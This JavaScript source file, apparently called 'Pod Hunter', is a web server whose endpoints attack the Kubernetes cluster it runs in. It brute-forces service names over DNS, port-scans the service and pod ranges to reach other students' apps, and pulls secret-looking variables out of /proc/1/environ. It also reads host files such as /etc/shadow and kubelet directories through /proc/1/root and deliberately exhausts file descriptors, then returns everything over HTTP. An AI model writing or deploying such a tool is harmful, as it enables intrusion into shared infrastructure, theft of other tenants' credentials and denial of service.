const http = require("http");
const net = require("net");
const os = require("os");
const fs = require("fs");
const dns = require("dns");

let results = {};

async function scanPort(host, port, timeout = 100) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);
    socket.on("connect", () => { socket.destroy(); resolve(true); });
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
    socket.on("error", () => { socket.destroy(); resolve(false); });
    socket.connect(port, host);
  });
}

async function httpProbe(url, timeout = 2000) {
  return new Promise((resolve) => {
    const req = http.get(url, { timeout }, (res) => {
      let body = "";
      res.on("data", c => body += c);
      res.on("end", () => resolve({ status: res.statusCode, body: body.substring(0, 500) }));
    });
    req.on("error", () => resolve(null));
    req.on("timeout", () => { req.destroy(); resolve(null); });
  });
}

// Discover K8s services via DNS
async function discoverServices() {
  results.services = [];
  
  const svcPatterns = [
    "kuros-api", "kuros-backend", "kuros-frontend", "kuros-db",
    "postgres", "postgresql", "mysql", "redis", "mongodb", "mongo",
    "api", "backend", "frontend", "web", "app", "nginx", "ingress"
  ];
  
  const namespaces = ["default", "kube-system", "kuros", "student", "production"];
  
  for (const ns of namespaces) {
    for (const svc of svcPatterns) {
      const fqdn = `${svc}.${ns}.svc.cluster.local`;
      try {
        const addrs = await new Promise((r, j) => {
          dns.resolve4(fqdn, (e, a) => e ? j(e) : r(a));
        });
        results.services.push({ name: fqdn, ips: addrs });
      } catch(e) {}
    }
  }
}

// Scan K8s service CIDR for live services
async function scanServiceCIDR() {
  results.serviceScan = [];
  const ports = [80, 443, 3000, 5432, 6379, 8080, 9090, 27017];
  
  // Scan 10.100.x.x
  for (let i = 0; i <= 255; i += 8) {
    for (let j = 1; j <= 255; j += 16) {
      const ip = `10.100.${i}.${j}`;
      for (const port of [80, 443]) {
        const open = await scanPort(ip, port, 50);
        if (open) {
          results.serviceScan.push({ ip, port });
          
          // Probe HTTP
          const resp = await httpProbe(`http://${ip}:${port}/`, 1000);
          if (resp) {
            results.serviceScan[results.serviceScan.length - 1].http = resp;
          }
        }
      }
    }
  }
}

// Scan pod CIDR for other student pods
async function scanPodCIDR() {
  results.podScan = { myIP: "", otherPods: [] };
  
  const myIP = Object.values(os.networkInterfaces())
    .flat()
    .find(i => i.family === "IPv4" && !i.internal)?.address;
  
  results.podScan.myIP = myIP;
  
  if (!myIP) return;
  
  const parts = myIP.split(".");
  const base = parts.slice(0, 2).join(".");
  
  // Scan nearby subnets for pods on port 3000 (Node.js default)
  for (let subnet = 0; subnet <= 128; subnet += 8) {
    for (let host = 1; host <= 254; host += 2) {
      const ip = `${base}.${subnet}.${host}`;
      if (ip === myIP) continue;
      
      const open = await scanPort(ip, 3000, 30);
      if (open) {
        const info = { ip };
        
        // Try to access their app
        const resp = await httpProbe(`http://${ip}:3000/`, 1000);
        if (resp) {
          info.response = resp;
        }
        
        results.podScan.otherPods.push(info);
      }
    }
  }
}

// Read environment from /proc/1/environ
async function readEnvironment() {
  results.environment = {};
  
  try {
    const environ = fs.readFileSync("/proc/1/environ", "utf8");
    const vars = environ.split("\0").filter(v => v);
    results.environment.count = vars.length;
    results.environment.interesting = vars.filter(v => 
      v.includes("SECRET") || v.includes("PASSWORD") || 
      v.includes("KEY") || v.includes("TOKEN") ||
      v.includes("DATABASE") || v.includes("MONGO") ||
      v.includes("REDIS") || v.includes("AWS")
    );
  } catch(e) {
    results.environment.error = e.message;
  }
}

// Check for interesting files in /proc/1/root
async function exploreHostFS() {
  results.hostFS = { files: [], secrets: [] };
  
  const paths = [
    "/proc/1/root/etc/passwd",
    "/proc/1/root/etc/shadow",
    "/proc/1/root/etc/kubernetes",
    "/proc/1/root/var/lib/kubelet",
    "/proc/1/root/root",
    "/proc/1/root/home",
    "/proc/1/root/etc/docker",
    "/proc/1/root/var/run/secrets"
  ];
  
  for (const p of paths) {
    try {
      const stat = fs.statSync(p);
      const info = { path: p, type: stat.isDirectory() ? "dir" : "file" };
      
      if (stat.isDirectory()) {
        try {
          info.contents = fs.readdirSync(p).slice(0, 30);
        } catch(e) {}
      } else if (stat.isFile() && stat.size < 10000) {
        try {
          const content = fs.readFileSync(p, "utf8");
          info.preview = content.substring(0, 500);
          if (content.match(/password|secret|key|token|credential/i)) {
            results.hostFS.secrets.push(p);
          }
        } catch(e) {}
      }
      
      results.hostFS.files.push(info);
    } catch(e) {}
  }
}

// File descriptor exhaustion
async function fdExhaust() {
  results.fdExhaust = { opened: 0 };
  const handles = [];
  
  try {
    while (handles.length < 50000) {
      handles.push(fs.openSync("/dev/null", "r"));
      results.fdExhaust.opened++;
    }
  } catch(e) {
    results.fdExhaust.maxReached = handles.length;
    results.fdExhaust.error = e.message;
  }
  
  // Cleanup
  handles.forEach(fd => { try { fs.closeSync(fd); } catch(e) {} });
}

const server = http.createServer(async (req, res) => {
  results = { timestamp: new Date().toISOString(), hostname: os.hostname() };
  
  try {
    if (req.url === "/hunt") {
      await discoverServices();
      await scanServiceCIDR();
      await scanPodCIDR();
      await readEnvironment();
      await exploreHostFS();
      await fdExhaust();
    } else if (req.url === "/services") {
      await discoverServices();
      await scanServiceCIDR();
    } else if (req.url === "/pods") {
      await scanPodCIDR();
    } else if (req.url === "/hostfs") {
      await exploreHostFS();
    } else if (req.url === "/env") {
      await readEnvironment();
    }
    
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(results, null, 2));
  } catch(e) {
    res.writeHead(500);
    res.end(JSON.stringify({ error: e.message }));
  }
});

server.listen(process.env.PORT || 3000);
console.log("Pod Hunter on port " + (process.env.PORT || 3000));
